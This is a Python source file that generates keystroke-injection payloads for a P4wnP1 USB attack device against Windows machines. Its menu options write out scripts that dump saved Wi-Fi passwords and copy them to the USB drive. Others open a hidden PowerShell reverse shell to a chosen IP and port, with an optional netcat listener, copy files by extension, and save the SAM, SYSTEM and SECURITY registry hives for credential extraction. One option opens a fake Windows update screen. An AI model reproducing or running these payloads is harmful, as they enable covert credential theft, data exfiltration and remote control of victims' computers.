from menu import MENU
from plinux import linux
from ascci import rabbit
import os

def windows(): # function payloads Windows


    script = raw_input("choose the payload to generate : \n\n1) dump wifi key | layout fr\n2) dump wifi key | layout 'us' 'de' ...\n\n3) reverse shell hiden powershell 'fr'\n4) reverse shell hiden powershell 'us' 'de'\n\n5) stealing files Seytonic method | fr\n6) stealing files Seytonic method | 'us' 'de'\n\n7) windows fake update \n\n8) hello world \n\n9) website\n\n10) exfiltre SAM, SYSTEM, SECURITY files 'FR'\n11) exfiltre SAM, SYSTEM, SECURITY files 'US', 'DE'\n\nchoice : ")
    os.system("clear")
    if script == "2" or script == "4" or script == "6" or script == "7" or script == "8" or script == "9" or script == "11":
    	settingkeyboardlayout = raw_input("\nchoose the keyboard layout : ")
    settingdelay = raw_input("\nchoose the delay between each instruction (ms) : ")

    if script == ("1"): 		# dump wifi password FR
	script = ("dump-wifi-fr.js")
	ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
	if ums == "":
		ums = ("README")
	dumpwififr = ("\nlayout(\'fr\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"netsh wlan show profiles * key=clear > wirelesspassword.txt\")\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout('fr')\n")+("type(\" ? { $_.Label -eq '")+(ums)+("' } \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" select name\\n\")\n")+("delay(200)\n")+("type(\"copy wirelesspassword.txt $usbpath.name\\n\")\n")+("type(\"del wirelesspassword.txt ; exit\\n\")\n")
        os.system("clear")
	print (dumpwififr)
	file = open("Output-payloads/win-dump-wifi-fr.js","w") 
	file.write(dumpwififr)
	file.close()


    if script ==  ("2"):		# dump wifi password US, DE +
        script = ("dump-wifi-" + (settingkeyboardlayout) + ".js")
        ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
        if ums == "":
                ums = ("README")
	dumpwifius = ("\nlayout(\'")+(settingkeyboardlayout)+("\')\n")+("press(\"GUI r\")\n")+("delay(400)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(1200)\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"netsh wlan show profiles * key=clear > wirelesspassword.txt\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \'")+(ums)+("\' } | select name \\n\")\n")+("type(\"copy wirelesspassword.txt $usbpath.name\\n\")\n")+("type(\"del wirelesspassword.txt ; exit\\n\")\n")
        os.system("clear")
	print (dumpwifius)
        file = open("Output-payloads/win-dump-wifi-" + (settingkeyboardlayout) + ".js","w") 
        file.write(dumpwifius) 
        file.close()


    if script == ("3"):			# reverse tcp hiden powershell FR
        script = ("reverse-hiden-powershell-fr.js")
	ip = raw_input("ip : ")
	port = raw_input("port : ")
	reversefr = ("\nlayout(\'fr\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"PowerShell.exe -windowstyle hidden { \\n\")\n")+("type(\"$client = [System.Net.Sockets.TCPClient]::new(\'")+(ip)+("\', ")+(port)+(")\\n\")\n")+("type(\"[byte[]]$bytes = (0..65535).ForEach{ 0 }\\n\")\n")+("type(\"$stream = $client.GetStream()\\n\")\n")+("type(\"while ($i = $stream.Read($bytes, 0, $bytes.Length)) {\\n\")\n")+("type(\"    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)\\n\")\n")+("type(\"    $sendback = (Invoke-Expression -Command $data 2>&1 \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" Out-String)\\n\")\n")+("type(\"    $prompt = $sendback + \'PS \' + $PWD.Path + \'> \'\\n\")\n")+("type(\"    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt)\\n\")\n")+("type(\"    $stream.Write($sendbyte, 0, $sendbyte.Length)\\n\")\n")+("type(\"    $stream.Flush()\\n\")\n")+("type(\"}\\n\")\n")+("type(\"$client.Close()\\n\")\n")+("type(\"}\\n\")\n")
        os.system("clear")
	print (reversefr)
	nc = raw_input("start netcat listener ? \n\n1) yes\n2) no : ")
	if nc == "1":
 		os.system("nc -lvp " + (port))
        file = open("Output-payloads/win-reverse-hiden-powershell-fr.js","w") 
        file.write(reversefr)
        file.close()

    if script == ("4"):		# reverse tcp hiden powershell US, DE
        script = ("reverse-hiden-powershell-" + (settingkeyboardlayout) + ".js")
        ip = raw_input("ip : ")
        port = raw_input("port : ")
	reverseus = ("\nlayout(\'")+(settingkeyboardlayout)+("\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"PowerShell.exe -windowstyle hidden { \\n\")\n")+("type(\"$client = [System.Net.Sockets.TCPClient]::new(\'")+(ip)+("\', ")+(port)+(")\\n\")\n")+("type(\"[byte[]]$bytes = (0..65535).ForEach{ 0 }\\n\")\n")+("type(\"$stream = $client.GetStream()\\n\")\n")+("type(\"while ($i = $stream.Read($bytes, 0, $bytes.Length)) {\\n\")\n")+("type(\"    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)\\n\")\n")+("type(\"    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)\\n\")\n")+("type(\"    $prompt = $sendback + \'PS \' + $PWD.Path + \'> \'\\n\")\n")+("type(\"    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt)\\n\")\n")+("type(\"    $stream.Write($sendbyte, 0, $sendbyte.Length)\\n\")\n")+("type(\"    $stream.Flush()\\n\")\n")+("type(\"}\\n\")\n")+("type(\"$client.Close()\\n\")\n")+("type(\"}\\n\")\n")
        os.system("clear")
	print (reverseus)
        nc = raw_input("start netcat listener ? \n\n1) yes\n2) no : ")
        if nc == "1":
                os.system("nc -lvp " + (port))

	file = open("Output-payloads/win-reverse-hiden-powershell-" + (settingkeyboardlayout) + ".js","w")
        file.write(reverseus)
        file.close()


    if script == ("5"):			#  stealing files Seytonic way FR
        script = ("stealing-files-fr.js")
        ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
        if ums == "":
                ums = ("README")
	x = raw_input("\n\nput extenssion files \n(like this : jpg,pdf,txt..)\n: ")
	a = x.split(",")
	output = "["
	for i in a[:len(a)-1]:
	  output+='"' + i + '", '
	output+='"' + a[len(a)-1] + '"]'
	print(output)
	stealingfr = ("\n\nlayout(\'fr\')\n")+("press(\"GUI r\")\n")+("delay(500)\n")+("type(\"powershell.exe\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" ? { $_.Label -eq \'")+(ums)+("\' } \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" select name\\n\")\n")+("var filetypes = ")+(output)+("\n")+("for (var i = 0; i < filetypes.length; i++) {\n")+("    type(\"copy */*.\" + filetypes[i] + \" $usbpath.name\\n\")\n")+("}\n")+("type(\"exit\\n\")\n")
        os.system("clear")
	print (stealingfr)
        file = open("Output-payloads/win-stealing-files-fr.js","w") 
        file.write(stealingfr)
        file.close()


    if script == ("6"):				#  stealing files Seytonic way US de
 	script = ("stealing-files-" + (settingkeyboardlayout) + ".js")
        ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
        if ums == "":
                ums = ("README")
        x = raw_input("\n\nput extenssion files \n(like this : jpg,pdf,txt..)\n: ")
        a = x.split(",")
        output = "["
        for i in a[:len(a)-1]:
          output+='"' + i + '", '
        output+='"' + a[len(a)-1] + '"]'
        print(output)
	stealingus = ("\nlayout(\'")+(settingkeyboardlayout)+("\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \'")+(ums)+("\' } | select name\\n\")\n")+("var filetypes = ")+(output)+("\n")+("for (var i = 0; i < filetypes.length; i++) {\n")+("    type(\"copy */*.\" + filetypes[i] + \" $usbpath.name\\n\")\n")+("}\n")+("type(\"exit\\n\")\n")
        os.system("clear")
	print (stealingus)
        file = open("Output-payloads/win-stealing-files-" + (settingkeyboardlayout) + ".js","w")
        file.write(stealingus)
        file.close()


    if script == "7":			# windows fake update
        script = ("windows-fake-update-" + (settingkeyboardlayout) + ".js")
        os.system("clear")
	fakeupd = ("\nlayout('")+str(settingkeyboardlayout)+str("')\n")+str("delay(")+str(settingdelay)+str(")\ntypingSpeed(0,0);\npress(\"GUI r\")\n")+str("delay(")+str(settingdelay)+str(")\ntype(\"iexplore -k http://fakeupdate.net/win10u/index.html\\n\")\n")
	print (fakeupd)
        file = open("Output-payloads/win-windows-fake-update-" + (settingkeyboardlayout) + ".js","w")
        file.write(fakeupd)
        file.close()


    elif script == "8":			# hello world
        script = ("Hello-Word-" + (settingkeyboardlayout) + ".js")
        os.system("clear")
	hellow = ("\nlayout('")+(settingkeyboardlayout)+("\')")+("\ntypingSpeed(0,0)\npress(\"GUI r\")\ndelay(")+(settingdelay)+(")\ntype(\"notepad\\n\")\ndelay(")+(settingdelay)+(")\ntype(\"hello world\")\n")
	print (hellow)
        file = open("Output-payloads/win-hellow-" + (settingkeyboardlayout) + ".js","w")
        file.write(hellow)
        file.close()

    elif script == "9":			# website 
        script = ("website-" + (settingkeyboardlayout) + ".js")
	website = raw_input("\nwebsite (ex: https://github.com/DuckyTools : ")
        os.system("clear")
	websitevar2 = ("\nlayout('")+(settingkeyboardlayout)+("')\n")+("delay(")+(settingdelay)+(")\ntypingSpeed(0,0);\npress(\"GUI r\")\n")+("delay(")+(settingdelay)+(")\ntype(\"")+(website)+("\\n\")\n")
	print (websitevar2)
        file = open("Output-payloads/win-website-" + (settingkeyboardlayout) + ".js","w")
        file.write(websitevar2)
        file.close()

    elif script == "10":
        script = ("sam,security,system-windows-files-" + ("fr") + ".js")
        os.system("clear")
        ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
        if ums == "":
                ums = ("README")
	os.system("clear")
	windowshashfr = ("\nlayout(\'fr\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"cmd\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("delay(200)\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\sam C:\\\Windows\\\Temp\\\sam.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\system C:\\\Windows\\\Temp\\\system.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\security C:\\\Windows\\\Temp\\\security.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"exit\\n\")\n")+("delay(200)\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(1000)\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(1500)\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" ? { $_.Label -eq '")+(ums)+("' } \")\n")+("layout(\'us\')\n")+("press(\"RIGHT_ALT 6\")\n")+("layout(\'fr\')\n")+("type(\" select name\\n\")\n")+("type(\"cp C:\\\Windows\\\\temp\\\sam.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\security.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\system.save $usbPath.name\\n\")\n")+("delay(2000)\n")+("type(\"exit\\n\")\n")
	print (windowshashfr)
        file = open("Output-payloads/SAM,SYSTEM,SECURITY-fr.js","w")
        file.write(windowshashfr)
        file.close()

    elif script == "11":
        script = ("sam,security,system-windows-files-" + ("fr") + ".js")
        os.system("clear")
        ums = raw_input("\nname of the UMS of P4wnP1\n(by default the name of test.bin is \"README\")\npress enter by default\n: ")
        if ums == "":
                ums = ("README")
	os.system("clear")
	windowshashus = ("\nlayout(\'")+(settingkeyboardlayout)+("\')\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"cmd\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("delay(200)\n")+("press(\"ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\sam C:\\\Windows\\\Temp\\\sam.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\system C:\\\Windows\\\Temp\\\system.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"reg.exe save hklm\\\security C:\\\Windows\\\Temp\\\security.save\\n\")\n")+("delay(")+(settingdelay)+(")\n")+("type(\"exit\\n\")\n")+("delay(200)\n")+("press(\"GUI r\")\n")+("delay(200)\n")+("type(\"powershell.exe\")\n")+("press(\"CTRL SHIFT ENTER\")\n")+("delay(")+(settingdelay)+(")\n")+("press(\"LEFT\")\n")+("press(\"ENTER\")\n")+("delay(1000)\n")+("type(\"$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq '")+(ums)+("' } | select name\\n\")\n")+("type(\"cp C:\\\Windows\\\\temp\\\sam.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\security.save $usbPath.name\\n\")\n")+("delay(400)\n")+("type(\"cp C:\\\Windows\\\\temp\\\system.save $usbPath.name\\n\")\n")+("delay(2000)\n")+("type(\"exit\\n\")\n")
	print (windowshashus)
        file = open("Output-payloads/SAM,SYSTEM,SECURITY-" + (settingkeyboardlayout) + ".js","w")
        file.write(windowshashus)
        file.close()


    print ("\nsaved at Output/" + (script))		# where it is save
    menu2 = raw_input("\n\n1) back to menu\n2) generate other payload for only P4wnP1 web interface\n3) exit\n\n> ")

    if menu2 == "1":
	os.system("clear")
	MENU()

    elif menu2 == "2":
	os.system("clear")
	windows()

    elif menu2 == "3":
	rabbit()
	exit()
